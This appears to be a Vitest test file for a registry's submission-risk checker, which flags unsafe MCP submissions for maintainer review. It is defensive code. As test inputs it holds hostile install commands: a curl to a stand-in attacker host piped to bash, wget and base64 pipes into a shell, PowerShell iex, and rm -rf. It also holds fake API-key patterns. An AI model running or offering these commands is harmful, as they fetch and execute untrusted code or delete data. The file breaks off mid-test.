import { describe, expect, it } from "vitest";

import {
  buildSubmissionPrDraft,
  validateSubmission,
} from "@heyclaude/registry/submission";
import {
  SUBMISSION_RISK_COMMENT_MARKER,
  SUBMISSION_RISK_SCHEMA_VERSION,
  analyzeDirectContentRisk,
  analyzeSubmissionDraftRisk,
  directContentRequestChangesReasons,
  formatSubmissionRiskMarkdown,
} from "../packages/registry/src/submission-risk-lib.js";

const dayMs = 86_400_000;

const validMcpFields = {
  category: "mcp",
  name: "Risk Review MCP",
  slug: "risk-review-mcp",
  github_url: "https://github.com/example/risk-review-mcp",
  docs_url: "https://example.com/risk-review-mcp",
  description:
    "Source-backed MCP server for deterministic submission risk review tests.",
  card_description: "Deterministic submission risk review MCP.",
  install_command: "npx -y risk-review-mcp",
  usage_snippet: "claude mcp add risk-review -- npx -y risk-review-mcp",
  safety_notes: "Runs a local MCP server process with user-selected tools.",
  privacy_notes: "Only handles context selected by the user.",
  tags: "mcp, review",
};

function sourceFile(
  content: string,
  filename = "content/mcp/risk-review-mcp.mdx",
) {
  return { filename, status: "added", content };
}

function validMcpMdx(overrides: Record<string, unknown> = {}) {
  const data = {
    title: "Risk Review MCP",
    slug: "risk-review-mcp",
    category: "mcp",
    description:
      "Source-backed MCP server for deterministic direct content review tests.",
    repoUrl: "https://github.com/example/risk-review-mcp",
    docsUrl: "https://example.com/risk-review-mcp",
    installCommand: "npx -y risk-review-mcp",
    usageSnippet: "claude mcp add risk-review -- npx -y risk-review-mcp",
    safetyNotes: ["Runs a local MCP process."],
    privacyNotes: ["Only handles user-selected project context."],
    submittedBy: "contributor",
    submittedByUrl: "https://github.com/contributor",
    ...overrides,
  };
  return mdxFromData(data);
}

function validMcpMdxNoSubmitter(overrides: Record<string, unknown> = {}) {
  const data = {
    title: "Risk Review MCP",
    slug: "risk-review-mcp",
    category: "mcp",
    description:
      "Source-backed MCP server for deterministic direct content review tests.",
    repoUrl: "https://github.com/example/risk-review-mcp",
    docsUrl: "https://example.com/risk-review-mcp",
    installCommand: "npx -y risk-review-mcp",
    usageSnippet: "claude mcp add risk-review -- npx -y risk-review-mcp",
    safetyNotes: ["Runs a local MCP process."],
    privacyNotes: ["Only handles user-selected project context."],
    ...overrides,
  };
  return mdxFromData(data);
}

function mdxFromData(data: Record<string, unknown>) {
  const lines = Object.entries(data).flatMap(([key, value]) => {
    if (Array.isArray(value)) {
      return [`${key}:`, ...value.map((item) => `  - ${item}`)];
    }
    return [`${key}: ${JSON.stringify(value)}`];
  });
  return `---\n${lines.join("\n")}\n---\n\nUseful setup and usage notes.`;
}

function externalDirectPr(
  files: Array<{ filename: string; status: string; content: string }>,
  overrides: Record<string, unknown> = {},
) {
  return {
    pullRequest: {
      number: 900,
      title: "content(mcp): add external direct mcp",
      user: {
        login: "contributor",
        created_at: new Date(Date.now() - 400 * dayMs).toISOString(),
        public_repos: 5,
      },
      head: { repo: { full_name: "contributor/awesome-claude" } },
      base: { repo: { full_name: "JSONbored/awesome-claude" } },
    },
    files,
    ...overrides,
  };
}

function singleContentPr(
  mdxOverrides: Record<string, unknown> = {},
  filename = "content/mcp/risk-review-mcp.mdx",
  extraFiles: Array<{ filename: string; status: string; content: string }> = [],
) {
  return externalDirectPr([
    sourceFile(validMcpMdx(mdxOverrides), filename),
    ...extraFiles,
  ]);
}

function reportWithFlag(flagId: string, severity = "critical") {
  return {
    subject: {
      type: "pull_request",
      sourceType: "external_direct",
      changedFileCount: 1,
      contentFileCount: 1,
    },
    sourceType: "external_direct",
    changedFileCount: 1,
    contentFileCount: 1,
    reviewFlags: [{ id: flagId, severity, summary: `${flagId} summary` }],
    classificationWarnings: [],
    provenanceFindings: [],
  };
}

function reportWithWarning(warningId: string) {
  return {
    subject: {
      type: "pull_request",
      sourceType: "external_direct",
      changedFileCount: 1,
      contentFileCount: 1,
    },
    sourceType: "external_direct",
    changedFileCount: 1,
    contentFileCount: 1,
    reviewFlags: [],
    classificationWarnings: [
      { id: warningId, summary: `${warningId} summary` },
    ],
    provenanceFindings: [],
  };
}

const FLAG_REASON_IDS = [
  "invalid_frontmatter",
  "missing_pr_file_content",
  "community_local_download_request",
  "commercial_listing_route",
  "non_https_executable_source",
  "unsafe_install_pipeline",
  "embedded_secret",
  "malicious_data_theft_capability",
  "prohibited_content",
] as const;

const WARNING_REASON_IDS = [
  "category_path_mismatch",
  "generated_readme_change",
  "generated_registry_artifact_change",
  "community_package_artifact_change",
  "unsafe_package_verified_true",
  "missing_safety_notes",
  "missing_privacy_notes",
] as const;

describe("submission-risk-lib constants", () => {
  it("exports SUBMISSION_RISK_SCHEMA_VERSION as 1", () => {
    expect(SUBMISSION_RISK_SCHEMA_VERSION).toBe(1);
  });

  it("exports SUBMISSION_RISK_COMMENT_MARKER html comment", () => {
    expect(SUBMISSION_RISK_COMMENT_MARKER).toBe(
      "<!-- submission-risk-report -->",
    );
  });
});

describe("directContentRequestChangesReasons non-PR subjects", () => {
  it.each([
    ["submission_draft", { type: "submission_draft" }],
    ["issue", { type: "issue" }],
    ["unknown", { type: "unknown" }],
    ["missing subject", undefined],
    ["empty subject", {}],
  ])("returns [] for %s subject", (_label, subject) => {
    expect(
      directContentRequestChangesReasons({
        subject,
        reviewFlags: [{ id: "unsafe_install_pipeline", severity: "critical" }],
      }),
    ).toEqual([]);
  });

  it("returns [] when PR is not external direct and not single-content shape", () => {
    expect(
      directContentRequestChangesReasons({
        subject: {
          type: "pull_request",
          sourceType: "same_repo_direct",
          changedFileCount: 3,
          contentFileCount: 2,
        },
        sourceType: "same_repo_direct",
        changedFileCount: 3,
        contentFileCount: 2,
        reviewFlags: [{ id: "embedded_secret", severity: "critical" }],
      }),
    ).toEqual([]);
  });

  it("returns reasons for external direct PRs regardless of file count", () => {
    const reasons = directContentRequestChangesReasons({
      subject: {
        type: "pull_request",
        sourceType: "external_direct",
        changedFileCount: 2,
        contentFileCount: 1,
      },
      sourceType: "external_direct",
      changedFileCount: 2,
      contentFileCount: 1,
      reviewFlags: [{ id: "embedded_secret", severity: "critical" }],
    });
    expect(reasons.some((reason) => reason.includes("embedded_secret"))).toBe(
      true,
    );
  });

  it("returns [] for multi-file same-repo PRs that are not single-content shape", () => {
    expect(
      directContentRequestChangesReasons({
        subject: {
          type: "pull_request",
          sourceType: "same_repo_direct",
          changedFileCount: 2,
          contentFileCount: 1,
        },
        sourceType: "same_repo_direct",
        changedFileCount: 2,
        contentFileCount: 1,
        reviewFlags: [{ id: "embedded_secret", severity: "critical" }],
      }),
    ).toEqual([]);
  });
});

describe("directContentRequestChangesReasons provenance blocking", () => {
  it("includes blocking provenance findings in request changes reasons", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 333,
        title: "content(mcp): import bad provenance",
        user: { login: "maintainer" },
        head: {
          ref: "automation/submission-789-bad-provenance",
          repo: { full_name: "JSONbored/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      sourceSubmissionContributors: [
        { number: 789, contributor: { login: "different-submitter" } },
      ],
      files: [
        sourceFile(
          validMcpMdx({
            submittedBy: "original-submitter",
            submittedByUrl: "https://github.com/not-original-submitter",
            sourceSubmissionNumber: 789,
            sourceSubmissionUrl:
              "https://github.com/JSONbored/awesome-claude/issues/790",
          }),
        ),
      ],
    });

    const reasons = directContentRequestChangesReasons(report);
    expect(
      reasons.some((reason) => reason.includes("Provenance validation failed")),
    ).toBe(true);
    expect(reasons.join("\n")).toContain("Provenance validation failed");
  });

  it("deduplicates identical request change reasons", () => {
    const report = reportWithFlag("embedded_secret");
    report.reviewFlags.push({
      id: "embedded_secret",
      severity: "critical",
      summary: "duplicate",
    });
    const reasons = directContentRequestChangesReasons(report);
    const secretReasons = reasons.filter((reason) =>
      reason.includes("embedded_secret"),
    );
    expect(secretReasons).toHaveLength(1);
  });
});

describe("directContentRequestChangesReasons flagReasons table", () => {
  const flagReasonExpectations: Record<
    (typeof FLAG_REASON_IDS)[number],
    string
  > = {
    invalid_frontmatter: "Content frontmatter could not be parsed.",
    missing_pr_file_content:
      "Content file could not be read through the GitHub API.",
    community_local_download_request:
      "Community PRs cannot request HeyClaude-hosted /downloads package URLs.",
    commercial_listing_route:
      "Commercial API relays, paid gateways, and pay-per-use proxy services belong in the tools/listing flow.",
    non_https_executable_source:
      "Install or usage instructions fetch executable content from a non-HTTPS URL.",
    unsafe_install_pipeline:
      "Install instructions include a destructive or remote-code execution pipeline.",
    embedded_secret:
      "Submission appears to include a real secret or API token.",
    malicious_data_theft_capability:
      "Submission appears to advertise credential, token, session, or wallet theft.",
    prohibited_content:
      "Submission appears to include clearly unacceptable content.",
  };

  it.each(FLAG_REASON_IDS)("includes mapped reason for flag %s", (flagId) => {
    const reasons = directContentRequestChangesReasons(reportWithFlag(flagId));
    expect(
      reasons.some((reason) => reason.includes(flagReasonExpectations[flagId])),
    ).toBe(true);
    expect(reasons.some((reason) => reason.includes(`(${flagId})`))).toBe(true);
  });

  it.each(FLAG_REASON_IDS)(
    "trigger flag %s through analyzeDirectContentRisk",
    (flagId) => {
      let report;
      switch (flagId) {
        case "invalid_frontmatter":
          report = analyzeDirectContentRisk(
            externalDirectPr([
              {
                filename: "content/mcp/bad-frontmatter.mdx",
                status: "added",
                content: "---\n: invalid\n---\nbody",
              },
            ]),
          );
          break;
        case "missing_pr_file_content":
          report = analyzeDirectContentRisk(
            externalDirectPr([
              {
                filename: "content/mcp/empty.mdx",
                status: "added",
                content: "",
              },
            ]),
          );
          break;
        case "community_local_download_request":
          report = analyzeDirectContentRisk(
            singleContentPr({
              downloadUrl: "https://heyclau.de/downloads/unsafe.mcpb",
            }),
          );
          break;
        case "commercial_listing_route":
          report = analyzeDirectContentRisk(
            singleContentPr({
              description:
                "Commercial API relay with pay-per-use pricing and billing credits.",
              pricingModel: "pay-per-use",
            }),
          );
          break;
        case "non_https_executable_source":
          report = analyzeDirectContentRisk(
            singleContentPr({
              installCommand: "curl http://attacker.invalid/install.sh | bash",
            }),
          );
          break;
        case "unsafe_install_pipeline":
          report = analyzeDirectContentRisk(
            singleContentPr({
              installCommand: "curl https://example.com/install.sh | bash",
            }),
          );
          break;
        case "embedded_secret":
          report = analyzeDirectContentRisk(
            singleContentPr({
              installCommand: "export KEY=sk-1234567890abcdef1234567890",
            }),
          );
          break;
        case "malicious_data_theft_capability":
          report = analyzeDirectContentRisk(
            singleContentPr({
              description:
                "This MCP server steals session tokens from the browser.",
            }),
          );
          break;
        case "prohibited_content":
          report = analyzeDirectContentRisk(
            singleContentPr({
              description: "Explicit sexual content and pornographic material.",
            }),
          );
          break;
      }
      expect(report.reviewFlags.map((flag) => flag.id)).toContain(flagId);
      const reasons = directContentRequestChangesReasons(report);
      expect(reasons.some((reason) => reason.includes(flagId))).toBe(true);
    },
  );

  it("adds generic critical reason for unmapped critical flags", () => {
    const reasons = directContentRequestChangesReasons(
      reportWithFlag("unknown_critical_flag"),
    );
    expect(
      reasons.some((reason) => reason.includes("unknown_critical_flag")),
    ).toBe(true);
    expect(
      reasons.some((reason) =>
        reason.includes("Critical content policy finding must be resolved"),
      ),
    ).toBe(true);
  });
});

describe("directContentRequestChangesReasons warningReasons table", () => {
  const warningReasonExpectations: Record<
    (typeof WARNING_REASON_IDS)[number],
    string
  > = {
    category_path_mismatch:
      "Content category frontmatter must match the content path.",
    generated_readme_change:
      "Direct contributor PRs should not edit README.md; maintainer automation regenerates it.",
    generated_registry_artifact_change:
      "Direct contributor PRs should not edit generated registry/data/download artifacts.",
    community_package_artifact_change:
      "Community PRs cannot add HeyClaude-hosted ZIP/MCPB package artifacts.",
    unsafe_package_verified_true:
      "External contributor PRs cannot mark packages as packageVerified: true.",
    missing_safety_notes:
      "Sensitive execution, install, package, background, or write behavior needs safetyNotes disclosure.",
    missing_privacy_notes:
      "Credential, local data, telemetry, or third-party data behavior needs privacyNotes disclosure.",
  };

  it.each(WARNING_REASON_IDS)(
    "includes mapped reason for warning %s",
    (warningId) => {
      const reasons = directContentRequestChangesReasons(
        reportWithWarning(warningId),
      );
      expect(
        reasons.some((reason) =>
          reason.includes(warningReasonExpectations[warningId]),
        ),
      ).toBe(true);
      expect(reasons.some((reason) => reason.includes(`(${warningId})`))).toBe(
        true,
      );
    },
  );

  it.each(WARNING_REASON_IDS)(
    "trigger warning %s through analyzeDirectContentRisk",
    (warningId) => {
      let report;
      switch (warningId) {
        case "category_path_mismatch":
          report = analyzeDirectContentRisk(
            singleContentPr({ category: "guides" }, "content/mcp/mismatch.mdx"),
          );
          break;
        case "generated_readme_change":
          report = analyzeDirectContentRisk(
            externalDirectPr([
              sourceFile(validMcpMdx(), "content/mcp/readme-case.mdx"),
              { filename: "README.md", status: "modified", content: "# hi" },
            ]),
          );
          break;
        case "generated_registry_artifact_change":
          report = analyzeDirectContentRisk(
            externalDirectPr([
              sourceFile(validMcpMdx(), "content/mcp/registry-case.mdx"),
              {
                filename: "apps/web/public/data/registry.json",
                status: "modified",
                content: "{}",
              },
            ]),
          );
          break;
        case "community_package_artifact_change":
          report = analyzeDirectContentRisk(
            externalDirectPr([
              sourceFile(validMcpMdx(), "content/mcp/pkg-case.mdx"),
              {
                filename: "content/mcp/evil.mcpb",
                status: "added",
                content: "binary",
              },
            ]),
          );
          break;
        case "unsafe_package_verified_true":
          report = analyzeDirectContentRisk(
            singleContentPr({ packageVerified: true }),
          );
          break;
        case "missing_safety_notes":
          report = analyzeDirectContentRisk(
            singleContentPr({
              installCommand: "curl https://example.com/install.sh | bash",
              safetyNotes: [],
            }),
          );
          break;
        case "missing_privacy_notes":
          report = analyzeDirectContentRisk(
            singleContentPr({
              description: "Requires API keys and OAuth bearer tokens.",
              privacyNotes: [],
            }),
          );
          break;
      }
      expect(
        report.classificationWarnings.map((warning) => warning.id),
      ).toContain(warningId);
      const reasons = directContentRequestChangesReasons(report);
      expect(reasons.some((reason) => reason.includes(warningId))).toBe(true);
    },
  );
});

describe("analyzeSubmissionDraftRisk unsafe install pipelines", () => {
  const unsafeInstallCases = [
    ["curl pipe bash", "curl https://example.com/install.sh | bash"],
    ["wget pipe sh", "wget -O- http://example.com/install.sh | sh"],
    ["curl pipe sudo bash", "curl https://x.com/i.sh | sudo bash"],
    ["invoke-expression", "Invoke-Expression (Get-Content script.ps1)"],
    ["iex alias", "iex (irm https://example.com/script.ps1)"],
    ["base64 decode pipe", "echo c2NyaXB0 | base64 -d | bash"],
    ["rm rf tmp path", "rm -rf /tmp/evil"],
  ] as const;

  it.each(unsafeInstallCases)(
    "flags unsafe_install_pipeline for %s",
    (_label, installCommand) => {
      const draft = buildSubmissionPrDraft({
        ...validMcpFields,
        install_command: installCommand,
      });
      const validation = validateSubmission(draft);
      const report = analyzeSubmissionDraftRisk(draft, validation);
      expect(report.reviewFlags.map((flag) => flag.id)).toContain(
        "unsafe_install_pipeline",
      );
      expect(report.riskTier).toBe("critical");
    },
  );

  it("flags non_https_executable_source for remote http install URLs", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      install_command: "curl http://attacker.invalid/install.sh | bash",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
    expect(report.riskTier).toBe("critical");
  });

  const exemptLoopbackUrls = [
    "curl http://127.0.0.1:8080/install.sh",
    "curl http://localhost:3000/setup",
    "curl http://0.0.0.0:5000/start",
  ] as const;

  it.each(exemptLoopbackUrls)(
    "exempts loopback http install URL from non_https_executable_source: %s",
    (installCommand) => {
      const draft = buildSubmissionPrDraft({
        ...validMcpFields,
        install_command: installCommand,
      });
      const validation = validateSubmission(draft);
      const report = analyzeSubmissionDraftRisk(draft, validation);
      expect(report.reviewFlags.map((flag) => flag.id)).not.toContain(
        "non_https_executable_source",
      );
    },
  );

  it("flags bracketed IPv6 loopback URLs because hostname normalization differs", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      install_command: "curl http://[::1]:9090/run",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "non_https_executable_source",
    );
  });
});

describe("analyzeSubmissionDraftRisk secrets and credentials", () => {
  const secretPatterns = [
    ["openai sk key", "sk-1234567890abcdef1234567890"],
    ["github pat", "github_pat_1234567890abcdef1234567890abcdef1234567890"],
    ["github ghp token", "ghp_1234567890abcdef1234567890"],
    ["aws akia key", "AKIA1234567890ABCDEF"],
    ["xq token", "xq_1234567890abcdef1234567890abcdef1234567890"],
  ] as const;

  it.each(secretPatterns)("flags embedded_secret for %s", (_label, secret) => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: `Uses token ${secret} in examples.`,
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "embedded_secret",
    );
    expect(report.riskTier).toBe("critical");
  });

  const credentialPhrases = [
    "Requires an API key in the Authorization header.",
    "Configure OAuth bearer token before use.",
    "Set x-api-key for developer access.",
    "Supports keyed API workflows for agents.",
    "Needs access keys for the agent tool.",
  ];

  it.each(credentialPhrases)("flags requires_credentials for: %s", (phrase) => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: phrase,
      privacy_notes: "Handles user-provided credentials locally.",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "requires_credentials",
    );
  });
});

describe("analyzeSubmissionDraftRisk contributor reputation", () => {
  it("flags new_contributor_account for accounts younger than 7 days", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation, {
      contributor: {
        login: "brand-new",
        type: "User",
        created_at: new Date(Date.now() - 2 * dayMs).toISOString(),
        public_repos: 1,
      },
    });
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "new_contributor_account",
    );
    expect(report.contributorAnalysis.reviewSignals).toContain("new_account");
  });

  it("flags young_contributor_account for accounts younger than 30 days", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation, {
      contributor: {
        login: "young-user",
        created_at: new Date(Date.now() - 15 * dayMs).toISOString(),
        public_repos: 3,
      },
    });
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "young_contributor_account",
    );
    expect(report.contributorAnalysis.reviewSignals).toContain("young_account");
  });

  it("records bot_account and no_public_repositories signals", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation, {
      contributor: {
        login: "risk-bot[bot]",
        type: "Bot",
        created_at: new Date(Date.now() - 400 * dayMs).toISOString(),
        public_repos: 0,
      },
    });
    expect(report.contributorAnalysis.reviewSignals).toEqual(
      expect.arrayContaining(["bot_account", "no_public_repositories"]),
    );
  });

  it("adds trust signals for established contributors with public repos", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation, {
      contributor: {
        login: "veteran-dev",
        created_at: new Date(Date.now() - 400 * dayMs).toISOString(),
        public_repos: 42,
      },
    });
    expect(report.contributorAnalysis.reviewSignals).toContain(
      "established_account",
    );
    expect(report.trustSignals.some((signal) => signal.includes("42"))).toBe(
      true,
    );
  });
});

describe("analyzeSubmissionDraftRisk tool listing classification", () => {
  it("warns when non-tools submission looks like hosted tool listing", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      category: "skills",
      name: "Hosted SaaS Skill",
      slug: "hosted-saas-skill",
      description: "A hosted SaaS application with subscription pricing.",
      website_url: "https://example.com/app",
      pricing_model: "subscription",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).toContain("tools_category_routing");
  });

  it("warns when tools category is missing listing metadata", () => {
    const draft = buildSubmissionPrDraft({
      category: "tools",
      name: "Hosted Tool",
      slug: "hosted-tool",
      description: "A hosted application for teams.",
      github_url: "https://github.com/example/hosted-tool",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).toContain("tools_listing_metadata_missing");
  });

  it("does not warn tools_category_routing when category is already tools", () => {
    const draft = buildSubmissionPrDraft({
      category: "tools",
      name: "Complete Tool Listing",
      slug: "complete-tool-listing",
      description: "Hosted SaaS workspace.",
      github_url: "https://github.com/example/tool",
      website_url: "https://example.com",
      docs_url: "https://example.com/docs",
      pricing_model: "freemium",
      disclosure: "none",
      application_category: "productivity",
      operating_system: "web",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).not.toContain("tools_category_routing");
  });
});

describe("analyzeSubmissionDraftRisk schema signals", () => {
  it("flags schema_invalid when validation fails", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      github_url: "not-a-url",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(validation.ok).toBe(false);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "schema_invalid",
    );
    expect(report.recommendedAction).toBe("request_author_input");
  });

  it("flags schema_skipped when validation is skipped", () => {
    const draft = { title: "Not a submission", body: "Random text" };
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(validation.skipped).toBe(true);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "schema_skipped",
    );
  });

  it("adds trust signal when schema validation passes", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(validation.ok).toBe(true);
    expect(report.trustSignals).toContain("Schema validation passed");
  });

  it("flags no_canonical_source when source URLs are missing", () => {
    const draft = buildSubmissionPrDraft({
      category: "mcp",
      name: "No Source MCP",
      slug: "no-source-mcp",
      description: "MCP without canonical URLs.",
      install_command: "npx -y no-source-mcp",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "no_canonical_source",
    );
  });
});

describe("analyzeSubmissionDraftRisk capability flags", () => {
  it("flags external_write_capability for social automation", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description:
        "Automates tweet replies and posting through X.com webhooks.",
      safety_notes: "Requires explicit user consent before posting.",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "external_write_capability",
    );
  });

  it("flags local_or_personal_data_access for browser automation", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: "Reads browser state and local workspace files on macOS.",
      safety_notes: "Local-only automation.",
      privacy_notes: "Does not exfiltrate data.",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "local_or_personal_data_access",
    );
  });

  it("flags background_worker_or_daemon for startup automation", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: "Runs as a background daemon with launch agent on startup.",
      safety_notes: "Background process details.",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "background_worker_or_daemon",
    );
  });

  it("flags destructive_actions for delete capabilities", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: "Can delete email records and database rows on request.",
      safety_notes: "Destructive operations require confirmation.",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "destructive_actions",
    );
  });

  it("flags financial_or_identity_sensitive for wallet flows", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: "Handles USDC wallet payments and on-chain KYC checks.",
      safety_notes: "Financial workflow safety notes.",
      privacy_notes: "Wallet data stays local.",
    });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "financial_or_identity_sensitive",
    );
  });

  it("includes source repository metadata from options", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation, {
      sourceRepositories: [
        {
          full_name: "example/risk-review-mcp",
          html_url: "https://github.com/example/risk-review-mcp",
          default_branch: "main",
          visibility: "public",
          stargazers_count: 99,
          forks_count: 7,
        },
      ],
    });
    expect(report.contributionAnalysis.githubSourceRepos).toEqual([
      expect.objectContaining({
        fullName: "example/risk-review-mcp",
        defaultBranch: "main",
        stargazersCount: 99,
      }),
    ]);
  });
});

describe("analyzeDirectContentRisk empty and missing content", () => {
  it("flags no_content_mdx_files when PR has no MDX content files", () => {
    const report = analyzeDirectContentRisk(
      externalDirectPr([
        {
          filename: "README.md",
          status: "modified",
          content: "# readme",
        },
      ]),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "no_content_mdx_files",
    );
  });

  it("flags missing_pr_file_content for empty MDX file content", () => {
    const report = analyzeDirectContentRisk(
      externalDirectPr([
        { filename: "content/mcp/empty.mdx", status: "added", content: "" },
      ]),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "missing_pr_file_content",
    );
  });

  it("ignores removed MDX files when counting content files", () => {
    const report = analyzeDirectContentRisk(
      externalDirectPr([
        {
          filename: "content/mcp/removed.mdx",
          status: "removed",
          content: validMcpMdx(),
        },
      ]),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "no_content_mdx_files",
    );
  });
});

describe("analyzeDirectContentRisk unsafe packages", () => {
  it("flags community_local_download_request for heyclau.de downloads", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        downloadUrl: "https://heyclau.de/downloads/evil-package.mcpb",
      }),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "community_local_download_request",
    );
    expect(["medium", "high"]).toContain(report.riskTier);
  });

  it("flags community_archive_download for external archive URLs", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        downloadUrl: "https://example.com/releases/tool.zip",
      }),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "community_archive_download",
    );
  });

  it("flags downloadable_binary_or_installer for binary references", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        description: "Download the dmg installer for macOS.",
      }),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "downloadable_binary_or_installer",
    );
  });
});

describe("analyzeDirectContentRisk provenance import", () => {
  it("passes complete automation-import provenance", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 222,
        title: "content(mcp): import risk review mcp",
        user: { login: "maintainer" },
        head: {
          ref: "automation/submission-456-risk-review",
          repo: { full_name: "JSONbored/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      sourceSubmissionContributors: [
        {
          number: 456,
          contributor: {
            login: "original-submitter",
            html_url: "https://github.com/original-submitter",
            created_at: new Date(Date.now() - 400 * dayMs).toISOString(),
            public_repos: 9,
          },
        },
      ],
      files: [
        sourceFile(
          validMcpMdx({
            submittedBy: "original-submitter",
            submittedByUrl: "https://github.com/original-submitter",
            sourceSubmissionNumber: 456,
            sourceSubmissionUrl:
              "https://github.com/JSONbored/awesome-claude/issues/456",
            importPrNumber: 222,
            importPrUrl: "https://github.com/JSONbored/awesome-claude/pull/222",
          }),
        ),
      ],
    });
    expect(report.subject?.sourceType).toBe("automation_import");
    expect(report.provenanceStatus).toBe("passed");
    expect(report.contributorSource).toBe("source_submission_author");
    expect(report.effectiveContributor?.login).toBe("original-submitter");
  });

  it("uses frontmatter contributors for same_repo_direct PRs", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 444,
        title: "content(mcp): add maintainer-imported mcp",
        user: { login: "maintainer" },
        head: {
          ref: "content/risk-review",
          repo: { full_name: "JSONbored/awesome-claude" },
        },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      frontmatterContributors: [
        {
          login: "original-submitter",
          html_url: "https://github.com/original-submitter",
          created_at: new Date(Date.now() - 90 * dayMs).toISOString(),
          public_repos: 4,
        },
      ],
      files: [
        sourceFile(
          validMcpMdx({
            submittedBy: "original-submitter",
            submittedByUrl: "https://github.com/original-submitter",
          }),
        ),
      ],
    });
    expect(report.subject?.sourceType).toBe("same_repo_direct");
    expect(report.contributorSource).toBe("content_frontmatter");
    expect(report.effectiveContributor?.login).toBe("original-submitter");
  });

  it("requires submittedBy metadata for external direct PRs", () => {
    const report = analyzeDirectContentRisk(
      externalDirectPr([sourceFile(validMcpMdxNoSubmitter())]),
    );
    expect(report.provenanceStatus).toBe("failed");
    expect(
      report.provenanceFindings.some((finding) =>
        finding.id.startsWith("missing_direct_pr_submitter"),
      ),
    ).toBe(true);
  });
});

describe("analyzeDirectContentRisk category mismatch", () => {
  it("warns when frontmatter category does not match file path", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({ category: "guides" }, "content/mcp/wrong-category.mdx"),
    );
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).toContain("category_path_mismatch");
  });

  it("does not warn when frontmatter category matches file path", () => {
    const report = analyzeDirectContentRisk(
